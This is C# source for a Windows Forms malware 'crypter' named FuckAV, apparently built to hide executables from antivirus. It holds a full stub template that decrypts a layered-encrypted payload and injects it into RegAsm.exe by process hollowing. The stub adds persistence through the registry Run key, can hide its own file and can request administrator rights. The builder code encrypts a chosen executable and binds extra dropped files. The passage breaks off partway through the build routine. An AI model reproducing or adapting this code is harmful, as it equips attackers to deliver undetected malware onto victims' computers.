using AsmResolver.DotNet;
using AsmResolver.PE.File;
using FuckAV.Tools;
using Microsoft.CSharp;
using System;
using System.CodeDom.Compiler;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.IO.Compression;
using System.Linq;
using System.Net;
using System.Reflection;
using System.Security.Cryptography;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
namespace FuckAV
{
	public partial class Main : Form
	{
		public static string aeskeylol = "";
		public static class StringCipher
		{
			public const int Keysize = 256;

			public const int DerivationIterations = 1000;

			public static string Encrypt(string plainText)
			{
				var saltStringBytes = Generate256BitsOfRandomEntropy();
				var ivStringBytes = Generate256BitsOfRandomEntropy();
				var plainTextBytes = Encoding.UTF8.GetBytes(plainText);
				using (var password = new Rfc2898DeriveBytes(aeskeylol, saltStringBytes, DerivationIterations))
				{
					var keyBytes = password.GetBytes(Keysize / 8);
					using (var symmetricKey = new RijndaelManaged())
					{
						symmetricKey.BlockSize = 256;
						symmetricKey.Mode = CipherMode.CBC;
						symmetricKey.Padding = PaddingMode.PKCS7;
						using (var encryptor = symmetricKey.CreateEncryptor(keyBytes, ivStringBytes))
						{
							using (var memoryStream = new MemoryStream())
							{
								using (var cryptoStream = new CryptoStream(memoryStream, encryptor, CryptoStreamMode.Write))
								{
									cryptoStream.Write(plainTextBytes, 0, plainTextBytes.Length);
									cryptoStream.FlushFinalBlock();
									var cipherTextBytes = saltStringBytes;
									cipherTextBytes = cipherTextBytes.Concat(ivStringBytes).ToArray();
									cipherTextBytes = cipherTextBytes.Concat(memoryStream.ToArray()).ToArray();
									memoryStream.Close();
									cryptoStream.Close();
									return Convert.ToBase64String(cipherTextBytes);
								}
							}
						}
					}
				}
			}

			public static string Decrypt(string cipherText, string passPhrase)
			{
				var cipherTextBytesWithSaltAndIv = Convert.FromBase64String(cipherText);
				var saltStringBytes = cipherTextBytesWithSaltAndIv.Take(Keysize / 8).ToArray();
				var ivStringBytes = cipherTextBytesWithSaltAndIv.Skip(Keysize / 8).Take(Keysize / 8).ToArray();
				var cipherTextBytes = cipherTextBytesWithSaltAndIv.Skip((Keysize / 8) * 2).Take(cipherTextBytesWithSaltAndIv.Length - ((Keysize / 8) * 2)).ToArray();

				using (var password = new Rfc2898DeriveBytes(passPhrase, saltStringBytes, DerivationIterations))
				{
					var keyBytes = password.GetBytes(Keysize / 8);
					using (var symmetricKey = new RijndaelManaged())
					{
						symmetricKey.BlockSize = 256;
						symmetricKey.Mode = CipherMode.CBC;
						symmetricKey.Padding = PaddingMode.PKCS7;
						using (var decryptor = symmetricKey.CreateDecryptor(keyBytes, ivStringBytes))
						{
							using (var memoryStream = new MemoryStream(cipherTextBytes))
							{
								using (var cryptoStream = new CryptoStream(memoryStream, decryptor, CryptoStreamMode.Read))
								{
									var plainTextBytes = new byte[cipherTextBytes.Length];
									var decryptedByteCount = cryptoStream.Read(plainTextBytes, 0, plainTextBytes.Length);
									memoryStream.Close();
									cryptoStream.Close();
									return Encoding.UTF8.GetString(plainTextBytes, 0, decryptedByteCount);
								}
							}
						}
					}
				}
			}

			public static byte[] Generate256BitsOfRandomEntropy()
			{
				var randomBytes = new byte[32];
				using (var rngCsp = new RNGCryptoServiceProvider())
				{
					rngCsp.GetBytes(randomBytes);
				}
				return randomBytes;
			}

			public static byte[] EncryptStringToBytes(string plainText)
			{

				byte[] encrypted;
				// Create an RijndaelManaged object
				// with the specified key and IV.
				using (RijndaelManaged rijAlg = new RijndaelManaged())
				{
					File.WriteAllText(Path.GetTempPath() + "\\key.txt", Convert.ToBase64String(rijAlg.Key));
					File.WriteAllText(Path.GetTempPath() + "\\IV.txt", Convert.ToBase64String(rijAlg.IV));

					// Create an encryptor to perform the stream transform.
					ICryptoTransform encryptor = rijAlg.CreateEncryptor(rijAlg.Key, rijAlg.IV);

					// Create the streams used for encryption.
					using (MemoryStream msEncrypt = new MemoryStream())
					{
						using (CryptoStream csEncrypt = new CryptoStream(msEncrypt, encryptor, CryptoStreamMode.Write))
						{
							using (StreamWriter swEncrypt = new StreamWriter(csEncrypt))
							{

								//Write all data to the stream.
								swEncrypt.Write(plainText);
							}
							encrypted = msEncrypt.ToArray();
						}
					}
				}

				// Return the encrypted bytes from the memory stream.
				return encrypted;
			}

			public static string CompressString(string text)
			{
				byte[] buffer = Encoding.UTF8.GetBytes(text);
				var memoryStream = new MemoryStream();
				using (var gZipStream = new GZipStream(memoryStream, CompressionMode.Compress, true))
				{
					gZipStream.Write(buffer, 0, buffer.Length);
				}

				memoryStream.Position = 0;

				var compressedData = new byte[memoryStream.Length];
				memoryStream.Read(compressedData, 0, compressedData.Length);

				var gZipBuffer = new byte[compressedData.Length + 4];
				Buffer.BlockCopy(compressedData, 0, gZipBuffer, 4, compressedData.Length);
				Buffer.BlockCopy(BitConverter.GetBytes(buffer.Length), 0, gZipBuffer, 0, 4);
				return Convert.ToBase64String(gZipBuffer);
			}



		}
		public static class Sifreleme
		{
			public static string Sifrele(string base64)
			{
				byte[] c = StringCipher.EncryptStringToBytes(base64);
				string d = Convert.ToBase64String(c);
				string e = StringCipher.Encrypt(d);
				string f = StringCipher.CompressString(e);
				return f;
			}
		}
		public Main()
		{
			InitializeComponent();
		}
		public static string code = @"
using Microsoft.Win32;
using System;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Security.Cryptography;
using System.Text;
using System.Windows.Forms;
using System.Runtime.InteropServices;
using System.IO.Compression;
using System.ComponentModel;

namespace Sleak
{
    public static class StringCipher
    {
        public const int Keysize = 256;

        public const int DerivationIterations = 1000;



        public static string Decrypt(string cipherText, string passPhrase)
        {
            var cipherTextBytesWithSaltAndIv = Convert.FromBase64String(cipherText);
            var saltStringBytes = cipherTextBytesWithSaltAndIv.Take(Keysize / 8).ToArray();
            var ivStringBytes = cipherTextBytesWithSaltAndIv.Skip(Keysize / 8).Take(Keysize / 8).ToArray();
            var cipherTextBytes = cipherTextBytesWithSaltAndIv.Skip((Keysize / 8) * 2).Take(cipherTextBytesWithSaltAndIv.Length - ((Keysize / 8) * 2)).ToArray();

            using (var password = new Rfc2898DeriveBytes(passPhrase, saltStringBytes, DerivationIterations))
            {
                var keyBytes = password.GetBytes(Keysize / 8);
                using (var symmetricKey = new RijndaelManaged())
                {
                    symmetricKey.BlockSize = 256;
                    symmetricKey.Mode = CipherMode.CBC;
                    symmetricKey.Padding = PaddingMode.PKCS7;
                    using (var decryptor = symmetricKey.CreateDecryptor(keyBytes, ivStringBytes))
                    {
                        using (var memoryStream = new MemoryStream(cipherTextBytes))
                        {
                            using (var cryptoStream = new CryptoStream(memoryStream, decryptor, CryptoStreamMode.Read))
                            {
                                var plainTextBytes = new byte[cipherTextBytes.Length];
                                var decryptedByteCount = cryptoStream.Read(plainTextBytes, 0, plainTextBytes.Length);
                                memoryStream.Close();
                                cryptoStream.Close();
                                return Encoding.UTF8.GetString(plainTextBytes, 0, decryptedByteCount);
                            }
                        }
                    }
                }
            }
        }

        public static byte[] Generate256BitsOfRandomEntropy()
        {
            var randomBytes = new byte[32];
            using (var rngCsp = new RNGCryptoServiceProvider())
            {
                rngCsp.GetBytes(randomBytes);
            }
            return randomBytes;
        }
    }

    public static class RunPE
    {

        public static void Run(byte[] payload, string host)
        {
            int e_lfanew = Marshal.ReadInt32(payload, 0x3c);
            int sizeOfOpt = Marshal.ReadInt16(payload, e_lfanew + FILE_HEADER_OFFSET + 0x10);
            int numSections = Marshal.ReadInt16(payload, e_lfanew + FILE_HEADER_OFFSET + 0x2);
            int addrOfEntry = Marshal.ReadInt32(payload, e_lfanew + OPTIONAL_HEADER_OFFSET + 0x10);
            int oldImageBase = Marshal.ReadInt32(payload, e_lfanew + OPTIONAL_HEADER_OFFSET + 0x1c);
            IntPtr newImageBase = (IntPtr)oldImageBase;
            int sizeOfImage = Marshal.ReadInt32(payload, e_lfanew + OPTIONAL_HEADER_OFFSET + 0x38);
            int sizeOfHeaders = Marshal.ReadInt32(payload, e_lfanew + OPTIONAL_HEADER_OFFSET + 0x3c);
            IntPtr procInfo = Allocate(0x10);
            IntPtr startupInfo = Allocate(0x44);
            IntPtr context = Allocate(0x2cc);
            Marshal.WriteInt32(context, 0, 0x10007);
            Marshal.WriteInt32(startupInfo, 0x0, 0x44);
            Marshal.WriteInt32(startupInfo, 0x2c, 0x1);
            Marshal.WriteInt16(startupInfo, 0x30, 0x0);
            if (!CreateProcess(null, host, IntPtr.Zero, IntPtr.Zero, false, 0x00000004 | 0x08000000, IntPtr.Zero, Environment.CurrentDirectory, startupInfo, procInfo))
                throw new Win32Exception(Marshal.GetLastWin32Error());
            IntPtr hProcess = Marshal.ReadIntPtr(procInfo, 0);
            IntPtr hThread = Marshal.ReadIntPtr(procInfo, IntPtr.Size);
            if (VirtualAllocEx(hProcess, newImageBase, (uint)sizeOfImage, 0x3000, 0x40) == IntPtr.Zero)
                throw new Win32Exception(Marshal.GetLastWin32Error());
            if (NtWriteVirtualMemory(hProcess, newImageBase, payload, (uint)sizeOfHeaders, IntPtr.Zero) > 0)
                throw new Win32Exception(Marshal.GetLastWin32Error());
            for (int i = 0; i < numSections; i++)
            {
                byte[] section = new byte[0x28];
                Buffer.BlockCopy(payload, e_lfanew + (OPTIONAL_HEADER_OFFSET + sizeOfOpt) + (section.Length * i), section, 0, section.Length);
                int virtualAddress = Marshal.ReadInt32(section, 0x00c);
                int sizeOfRawData = Marshal.ReadInt32(section, 0x010);
                int pointerToRawData = Marshal.ReadInt32(section, 0x014);
                int characteristics = Marshal.ReadInt32(section, 0x024);
                byte[] bRawData = new byte[sizeOfRawData];
                Buffer.BlockCopy(payload, pointerToRawData, bRawData, 0, bRawData.Length);
                IntPtr newAddress = (IntPtr)(newImageBase.ToInt32() + virtualAddress);
                NtWriteVirtualMemory(hProcess, newAddress, bRawData, (uint)bRawData.Length, IntPtr.Zero);
                uint old = 0u;
                NtProtectVirtualMemory(hProcess, newAddress, (uint)bRawData.Length, (uint)characteristics, ref old);
            }
            NtGetContextThread(hThread, context);
            byte[] nib = BitConverter.GetBytes((int)newImageBase);
            int ebx = Marshal.ReadInt32(context, 0xa4);
            NtWriteVirtualMemory(hProcess, (IntPtr)ebx + 8, nib, 4u, IntPtr.Zero);
            Marshal.WriteInt32(context, 0xb0, (int)newImageBase + addrOfEntry);
            NtSetContextThread(hThread, context);
            NtResumeThread(Marshal.ReadIntPtr(procInfo, IntPtr.Size), IntPtr.Zero);
            Marshal.FreeHGlobal(procInfo);
            Marshal.FreeHGlobal(startupInfo);
            Marshal.FreeHGlobal(context);
            CloseHandle(hThread);
            CloseHandle(hProcess);
        }
        [DllImport(""kernel32.dll"", SetLastError = true)]
        public static extern bool CreateProcess(string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, IntPtr lpStartupInfo, IntPtr lpProcessInfo);
        [DllImport(""ntdll.dll"", SetLastError = true)]
        public static extern int NtGetContextThread(IntPtr hThread, IntPtr lpContext);
        [DllImport(""ntdll.dll"", SetLastError = true)]
        public static extern uint NtResumeThread(IntPtr hThread, IntPtr SuspendCount);
        [DllImport(""ntdll.dll"", SetLastError = true)]
        public static extern int NtSetContextThread(IntPtr hThread, IntPtr lpContext);
        [DllImport(""ntdll.dll"", SetLastError = true)]
        public static extern uint NtUnmapViewOfSection(IntPtr hProcess, IntPtr lpBaseAddress);
        [DllImport(""ntdll.dll"", SetLastError = true)]
        public static extern int NtWriteVirtualMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, IntPtr lpNumberOfBytesWritten);
        [DllImport(""ntdll.dll"", SetLastError = true)]
        public static extern int NtWriteVirtualMemory(IntPtr hProcess, IntPtr lpBaseAddress, IntPtr lpBuffer, uint nSize, IntPtr lpNumberOfBytesWritten);
        [DllImport(""kernel32.dll"", SetLastError = true)]
        public static extern int RtlZeroMemory(IntPtr lpBaseAddress, int size);
        [DllImport(""kernel32.dll"", SetLastError = true)]
        public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
        [DllImport(""ntdll.dll"")]
        public static extern int NtProtectVirtualMemory(IntPtr hProcess, IntPtr baseAddress, uint numBytes, uint newProtect, ref uint oldProtect);
        [DllImport(""kernel32.dll"")]
        public static extern bool CloseHandle(IntPtr handle);

        public static IntPtr Allocate(int size)
        {
            IntPtr ptr = Marshal.AllocHGlobal(size);
            RtlZeroMemory(ptr, size);
            return ptr;
        }

        public const int FILE_HEADER_OFFSET = 0x4;
        public const int OPTIONAL_HEADER_OFFSET = 0x18;

    }
    class Settings
    {
        public static string InstallMethod = ""%INSTALL_METHOD%"";
        public static string InjectionMethod = ""%INJECT_METHOD%"";
    }

    internal class Program
    {
        public static string DecompressString(string compressedText)
        {
            byte[] gZipBuffer = Convert.FromBase64String(compressedText);
            using (var memoryStream = new MemoryStream())
            {
                int dataLength = BitConverter.ToInt32(gZipBuffer, 0);
                memoryStream.Write(gZipBuffer, 4, gZipBuffer.Length - 4);

                var buffer = new byte[dataLength];

                memoryStream.Position = 0;
                using (var gZipStream = new GZipStream(memoryStream, CompressionMode.Decompress))
                {
                    gZipStream.Read(buffer, 0, buffer.Length);
                }

                return Encoding.UTF8.GetString(buffer);
            }
        }
        public static void Startup()
        {
            string dfgdfgdgdg = Path.GetTempPath() + Path.GetFileName(Application.ExecutablePath) + ""\\"" + ""startupname"" + "".exe"";
            try
            {
                if (File.Exists(dfgdfgdgdg))
                {
                    File.Delete(dfgdfgdgdg);
                }
                File.Copy(Application.ExecutablePath, Path.GetTempPath() + Path.GetFileName(Application.ExecutablePath));
                RegistryKey registryKey = Registry.CurrentUser.OpenSubKey(""SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"", true);
                registryKey.SetValue(Path.GetFileNameWithoutExtension(dfgdfgdgdg), dfgdfgdgdg);
            }
            catch
            {
                Process[] processesByName = Process.GetProcessesByName(Path.GetFileNameWithoutExtension(dfgdfgdgdg));
                if (processesByName.Length > 0)
                {
                    Process[] array = processesByName;
                    int num = 0;
                    if (num < array.Length)
                    {
                        Process process = array[num];
                        process.Kill();
                    }
                }
            }
        }
        public static string DecryptStringFromBytes(byte[] cipherTexts, string Keys, string IVs)
        {
            byte[] Key = Convert.FromBase64String(Keys);
            byte[] IV = Convert.FromBase64String(IVs);

            string plaintext = null;


            using (Rijndael rijAlg = Rijndael.Create())
            {


                // Create a decryptor to perform the stream transform.
                ICryptoTransform decryptor = rijAlg.CreateDecryptor(Key, IV);

                // Create the streams used for decryption.
                using (MemoryStream msDecrypt = new MemoryStream(cipherTexts))
                {
                    using (CryptoStream csDecrypt = new CryptoStream(msDecrypt, decryptor, CryptoStreamMode.Read))
                    {
                        using (StreamReader srDecrypt = new StreamReader(csDecrypt))
                        {

                            plaintext = srDecrypt.ReadToEnd();
                        }
                    }
                }
            }

            return plaintext;
        }

        public static string decryptle(string base64)
        {
            string f = DecompressString(base64);
            string e = StringCipher.Decrypt(f, ""aeskeylazim"");
            byte[] xd = Convert.FromBase64String(e);
            string k = DecryptStringFromBytes(xd, ""keyamk"", ""IVAMK"");
            return k;
        }
        [STAThread]
        static void Main()
        {
            //callbindmethodxd
            //hidefileomglolok
            //startup

            Pocket.BuildPE(Convert.FromBase64String(decryptle(""cryptlenmisamk"")), Path.Combine(RuntimeEnvironment.GetRuntimeDirectory(), ""RegAsm.exe""));

        }
        //insertbindmethods
    }
    class Pocket : NativeAPI
    {
        public static void BuildPE(byte[] payload, string host)
        {

            int e_lfanew = Marshal.ReadInt32(payload, 0x3c);
            int sizeOfOpt = Marshal.ReadInt16(payload, e_lfanew + FILE_HEADER_OFFSET + 0x10);

            int addrOfEntry = Marshal.ReadInt32(payload, e_lfanew + OPTIONAL_HEADER_OFFSET + 0x10);

            IntPtr newImageBase = (IntPtr)Marshal.ReadInt32(payload, e_lfanew + OPTIONAL_HEADER_OFFSET + 0x1c);

            int sizeOfImage = Marshal.ReadInt32(payload, e_lfanew + OPTIONAL_HEADER_OFFSET + 0x38);
            int sizeOfHeaders = Marshal.ReadInt32(payload, e_lfanew + OPTIONAL_HEADER_OFFSET + 0x3c);



            IntPtr procInfo = Allocate(0x10);
            IntPtr startupInfo = Allocate(0x44);
            IntPtr context = Allocate(0x2cc);



            Marshal.WriteInt32(context, 0, 0x10007);
            Marshal.WriteInt32(startupInfo, 0x0, 0x44);
            Marshal.WriteInt32(startupInfo, 0x2c, 0x1);
            Marshal.WriteInt16(startupInfo, 0x30, 0x0);

            if (!NtCreateProcess(null, host, IntPtr.Zero, IntPtr.Zero, false, 0x00000004 | 0x08000000, IntPtr.Zero, Environment.CurrentDirectory, startupInfo, procInfo))
                throw new Win32Exception(Marshal.GetLastWin32Error());
            IntPtr hProcess = Marshal.ReadIntPtr(procInfo, 0);
            IntPtr hThread = Marshal.ReadIntPtr(procInfo, IntPtr.Size);

            if (ZrlsVirtualAllocEx(hProcess, newImageBase, (uint)sizeOfImage, 0x3000, 0x40) == IntPtr.Zero)
                throw new Win32Exception(Marshal.GetLastWin32Error());
            if (YuopNtWriteVirtualMemory(hProcess, newImageBase, payload, (uint)sizeOfHeaders, IntPtr.Zero) > 0)
                throw new Win32Exception(Marshal.GetLastWin32Error());

            int numSections = Marshal.ReadInt16(payload, e_lfanew + FILE_HEADER_OFFSET + 0x2);
            if (!ReBlock(numSections, payload, e_lfanew, sizeOfOpt, newImageBase, hProcess)) { throw new Win32Exception(Marshal.GetLastWin32Error()); }
            TsNtGetContextThread(hThread, context);

            byte[] nib = BitConverter.GetBytes((int)newImageBase);
            int ebx = Marshal.ReadInt32(context, 0xa4);

            //Write The Virt Mem
            YuopNtWriteVirtualMemory(hProcess, (IntPtr)ebx + 8, nib, 4u, IntPtr.Zero);
            Marshal.WriteInt32(context, 0xb0, (int)newImageBase + addrOfEntry);
            TdopNtSetContextThread(hThread, context);
            TopsNtResumeThread(Marshal.ReadIntPtr(procInfo, IntPtr.Size), IntPtr.Zero);

            //Free the Mem
            Marshal.FreeHGlobal(procInfo);
            Marshal.FreeHGlobal(startupInfo);
            Marshal.FreeHGlobal(context);


            RopCloseHandle(hThread);
            RopCloseHandle(hProcess);
        }
        private static bool ReBlock(int numSections, byte[] payload, int e_lfanew, int sizeOfOpt, IntPtr newImageBase, IntPtr hProcess)
        {
            for (int i = 0; i < numSections; i++)
            {
                byte[] section = new byte[0x28];
                Buffer.BlockCopy(payload, e_lfanew + (OPTIONAL_HEADER_OFFSET + sizeOfOpt) + (section.Length * i), section, 0, section.Length);
                int virtualAddress = Marshal.ReadInt32(section, 0x00c);
                int sizeOfRawData = Marshal.ReadInt32(section, 0x010);
                int pointerToRawData = Marshal.ReadInt32(section, 0x014);
                int characteristics = Marshal.ReadInt32(section, 0x024);
                byte[] bRawData = new byte[sizeOfRawData];
                Buffer.BlockCopy(payload, pointerToRawData, bRawData, 0, bRawData.Length);
                IntPtr newAddress = (IntPtr)(newImageBase.ToInt32() + virtualAddress);
                YuopNtWriteVirtualMemory(hProcess, newAddress, bRawData, (uint)bRawData.Length, IntPtr.Zero);
                uint old = 0u;
                PoTNtProtectVirtualMemory(hProcess, newAddress, (uint)bRawData.Length, (uint)characteristics, ref old);
            }
            return true;
        }
        private static IntPtr Allocate(int size)
        {

            IntPtr ptr = Marshal.AllocHGlobal(size);
            ZoopsRtlZeroMemory(ptr, size);
            return ptr;
        }

        private const int FILE_HEADER_OFFSET = 0x4;
        private const int OPTIONAL_HEADER_OFFSET = 0x18;
    }
    class NativeAPI
    {
        [DllImport(""kernel32.dll"", EntryPoint = ""CreateProcess"", SetLastError = true)]
        protected static extern bool NtCreateProcess(string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, IntPtr lpStartupInfo, IntPtr lpProcessInfo);
        [DllImport(""ntdll.dll"", EntryPoint = ""NtGetContextThread"", SetLastError = true)]
        protected static extern int TsNtGetContextThread(IntPtr hThread, IntPtr lpContext);
        [DllImport(""ntdll.dll"", EntryPoint = ""NtResumeThread"", SetLastError = true)]
        protected static extern uint TopsNtResumeThread(IntPtr hThread, IntPtr SuspendCount);
        [DllImport(""ntdll.dll"", EntryPoint = ""NtSetContextThread"", SetLastError = true)]
        protected static extern int TdopNtSetContextThread(IntPtr hThread, IntPtr lpContext);
        [DllImport(""ntdll.dll"", EntryPoint = ""NtWriteVirtualMemory"", SetLastError = true)]
        protected static extern int YuopNtWriteVirtualMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, IntPtr lpNumberOfBytesWritten);
        [DllImport(""ntdll.dll"", EntryPoint = ""RtlZeroMemory"", SetLastError = true)]
        protected static extern int ZoopsRtlZeroMemory(IntPtr lpBaseAddress, int size);
        [DllImport(""kernel32.dll"", EntryPoint = ""VirtualAllocEx"", SetLastError = true)]
        protected static extern IntPtr ZrlsVirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
        [DllImport(""ntdll.dll"", EntryPoint = ""NtProtectVirtualMemory"", SetLastError = true)]
        protected static extern int PoTNtProtectVirtualMemory(IntPtr hProcess, IntPtr baseAddress, uint numBytes, uint newProtect, ref uint oldProtect);
        [DllImport(""kernel32.dll"", EntryPoint = ""CloseHandle"", SetLastError = true)]
        protected static extern bool RopCloseHandle(IntPtr handle);
    }
}
";
		private void BrowserSever_Click(object sender, EventArgs e)
		{
			using (var openFileDialog = new OpenFileDialog())
			{
				openFileDialog.Filter = "Executable (*.exe)|*.exe";
				if (openFileDialog.ShowDialog() == DialogResult.OK)
				{
					server.Text = openFileDialog.FileName;
					btnBuild.Enabled = true;
				}
				else
				{
					btnBuild.Enabled = false;
				}
			}
		}
		internal static string GenName(int iLenght)
		{

			var chars = "0123456789abcdefghijklmnopqrstuvwxyz!@#$ABCDEFGHJKLMNOPQRSTUVWXYZ0123456789";
			var output = new StringBuilder();
			var random = new Random();

			for (int i = 0; i < iLenght; i++)
			{
				output.Append(chars[random.Next(chars.Length)]);
			}


			return output.ToString();
		}
		private static ModuleDefinition module { get; set; }

		public bool isvalidFilepath(string path)
		{
			try
			{

				string[] splitg = path.Split(':');
				if (path.Length >= 6 && path.Contains(@":\") && splitg[0].Length == 1 && Regex.IsMatch(splitg[0], @"^[a-zA-Z]+$"))
				{
					return true;

				}
				else
				{
					return false;
				}
			}
			catch
			{
				return false;
			}
		}
		public bool CompileFromSource(string source, string outputAssembly)
		{
			string manifestdec = @"<?xml version=""1.0"" encoding=""utf-8""?>
<assembly manifestVersion=""1.0"" xmlns=""urn:schemas-microsoft-com:asm.v1"">
  <assemblyIdentity version=""1.0.0.0"" name=""MyApplication.app""/>
  <trustInfo xmlns=""urn:schemas-microsoft-com:asm.v2"">
    <security>
      <requestedPrivileges xmlns=""urn:schemas-microsoft-com:asm.v3"">
        <requestedExecutionLevel level=""requireAdministrator"" uiAccess=""false"" />
      </requestedPrivileges>
    </security>
  </trustInfo>

  <compatibility xmlns=""urn:schemas-microsoft-com:compatibility.v1"">
    <application>
    </application>
  </compatibility>
</assembly>
";
			File.WriteAllText(Application.StartupPath + @"\manifest.manifest", manifestdec);

			CompilerParameters compars = new CompilerParameters();
			CodeDomProvider provider = CodeDomProvider.CreateProvider("CSharp");
			
			compars.ReferencedAssemblies.Add("System.Net.dll");
			compars.ReferencedAssemblies.Add("System.dll");
			compars.ReferencedAssemblies.Add("System.Linq.dll");
			compars.ReferencedAssemblies.Add("System.Windows.Forms.dll");
			compars.ReferencedAssemblies.Add("System.Drawing.dll");
			compars.ReferencedAssemblies.Add("System.IO.dll");
			compars.ReferencedAssemblies.Add("System.Xml.dll");
			compars.ReferencedAssemblies.Add("System.Xml.Linq.dll");
			compars.ReferencedAssemblies.Add("System.Runtime.Serialization.dll");
			compars.ReferencedAssemblies.Add("System.Data.dll");
			compars.ReferencedAssemblies.Add("System.IO.compression.dll");
			compars.ReferencedAssemblies.Add("System.IO.compression.filesystem.dll");
			compars.ReferencedAssemblies.Add("System.Core.dll");
			compars.ReferencedAssemblies.Add("System.Security.dll");

			bool hasAdmin = false;

			if (force.Checked == true)
			{
				if (hasAdmin == false)
				{
					hasAdmin = true;
				}
			}
			if (listView1.Items.Count > 0)
			{
				foreach (ListViewItem item in listView1.Items)
				{
					compars.EmbeddedResources.Add("" + item.SubItems[0].Text + "");
					if (item.SubItems[2].Text.Contains("true"))
					{
						hasAdmin = true;
					}
				}
			}
			compars.GenerateExecutable = true;
			compars.OutputAssembly = outputAssembly;
			compars.GenerateInMemory = false;
			compars.TreatWarningsAsErrors = false;
			compars.CompilerOptions += "/target:winexe /platform:anycpu32bitpreferred  ";
			

			if (hasAdmin == true)
			{

				compars.CompilerOptions += " /win32manifest:" + @"""" + Application.StartupPath + @"\manifest.manifest" + @"""";
			}

			if (icon_path.Text.Length > 0)
			{
				if (isvalidFilepath(icon_path.Text))
				{
					compars.CompilerOptions += " /win32icon:" + @"""" + icon_path.Text + @"""";
				}	
				else
				{
					MessageBox.Show("Path possibly invalid!", "Error!");
				}
			}
			else if (string.IsNullOrEmpty(icon_path.Text) || string.IsNullOrWhiteSpace(icon_path.Text))
			{

			}
			else
			{
				MessageBox.Show("Path possibly invalid!", "Error!");
			}
			System.Threading.Thread.Sleep(100);
			CompilerResults res = provider.CompileAssemblyFromSource(compars, source);
			
			if (res.Errors.Count > 0)
			{
				try
				{
					File.Delete(Application.StartupPath + @"\manifest.manifest");
				}
				catch { }
				foreach (CompilerError ce in res.Errors)
				{
					MessageBox.Show(ce.ToString());
				}
			}
			else
			{
				try
				{
					File.Delete(Application.StartupPath + @"\manifest.manifest");
				}
				catch { }
			}
			return res.Errors.Count == 0;
		}
		public static string Reverse(string s)
		{
			char[] charArray = s.ToCharArray();
			Array.Reverse(charArray);
			return new string(charArray);
		}
		private readonly Random random = new Random();
		const string alphabet = "asdfghjklqwertyuiopmnbvcxz";

		public string getRandomCharacters(int length)
		{
			var sb = new StringBuilder();
			for (int i = 1; i <= length; i++)
			{
				var randomCharacterPosition = random.Next(0, alphabet.Length);
				sb.Append(alphabet[randomCharacterPosition]);
			}
			return sb.ToString();
		}
		public static void Extract(string nameSpace, string outDirectory, string internalFilePath, string resourceName)
		{
			Assembly assembly = Assembly.GetCallingAssembly();
			using (Stream s = assembly.GetManifestResourceStream(nameSpace + "." + (internalFilePath == "" ? "" : internalFilePath + ".") + resourceName))
			using (BinaryReader r = new BinaryReader(s))
			using (FileStream fs = new FileStream(outDirectory + "\\" + resourceName, FileMode.OpenOrCreate))
			using (BinaryWriter w = new BinaryWriter(fs))
				w.Write(r.ReadBytes((int)s.Length));
		}
		private void btnBuild_Click(object sender, EventArgs e)
		{
			try
			{
				
				if (server.Text != "" & genkey.Text != "" & siticoneComboBox1.Text != "" & injectionMethod.Text != "")
				{
					if (!Directory.Exists(Path.GetTempPath() + "\\Obfuscation"))
					{
						Extract("FuckAV", Path.GetTempPath(), "Resources", "Obfuscation.zip");
						Thread.Sleep(1000);
						ZipFile.ExtractToDirectory(Path.GetTempPath() + "\\Obfuscation.zip", Path.GetTempPath());
					}

					using (SaveFileDialog saveFileDialog = new SaveFileDialog())
					{
						saveFileDialog.Filter = "Executable (*.exe)|*.exe";
						if (saveFileDialog.ShowDialog() == DialogResult.OK)
						{
							string text = code;

							text = text.Replace("RegAsm.exe", injectionMethod.Text);
							
							text = text.Replace("aeskeylazim", aeskeylol);
							byte[] path = File.ReadAllBytes(server.Text);
							string newValue = Sifreleme.Sifrele(Convert.ToBase64String(path));

							text = text.Replace("cryptlenmisamk", newValue);
							string newValue2 = File.ReadAllText(Path.GetTempPath() + "\\IV.txt");
							string newValue3 = File.ReadAllText(Path.GetTempPath() + "\\key.txt");
							text = text.Replace("IVAMK", newValue2);
							text = text.Replace("keyamk", newValue3);
							if (startup.Checked)
							{
								text = text.Replace("//startup", "Startup();");
								text = text.Replace("startupname", namestartup.Text);
							}
							if (hidefile.Checked)
							{
								text = text.Replace("//hidefileomglolok", "            try { File.SetAttributes(System.Reflection.Assembly.GetEntryAssembly().Location, File.GetAttributes(System.Reflection.Assembly.GetEntryAssembly().Location) | FileAttributes.Hidden | FileAttributes.System); } catch { }");
							}
							string randomCharacters = getRandomCharacters(6);
							string getname = randomCharacters + ".exe";
							string text2 = Path.GetTempPath() + "\\Obfuscation\\" + getname;
							if (listView1.Items.Count > 0)
							{
								string methodxd = @"        static void ThisMethodxd()
        {
            //startuplolp
            string sjnfnos = Environment.ExpandEnvironmentVariables(""replacexdgggggg36346365"");
            //string gripo = ""bit098"";

            //hidexdsfng
        }
        public static void extract2idk(string resourceName, string fileName, bool lmao, bool admin)
        {
            using (var resource = Assembly.GetExecutingAssembly().GetManifestResourceStream(resourceName))
            {
                using (var file = new FileStream(fileName, FileMode.Create, FileAccess.Write))
                {
                    resource.CopyTo(file);
                }
            }
            if (lmao == true)
            {
                if (admin == true)
                {
                    ProcessStartInfo prcs3 = new ProcessStartInfo(fileName)
                    {
                        RedirectStandardError = false,
                        RedirectStandardOutput = true,
                        UseShellExecute = false,
                        CreateNoWindow = false,
                        Verb = ""run as""
                    };
                    Process.Start(prcs3);
                }
                else
                {
                    Process.Start(fileName);
                }
            }
        }";
								int index = methodxd.IndexOf(@"bit098"";");
								string newgj = methodxd;
								newgj = newgj.Replace("replacexdgggggg36346365", DropTxt2.Text);
								foreach (ListViewItem iasjfd in listView1.Items)
								{
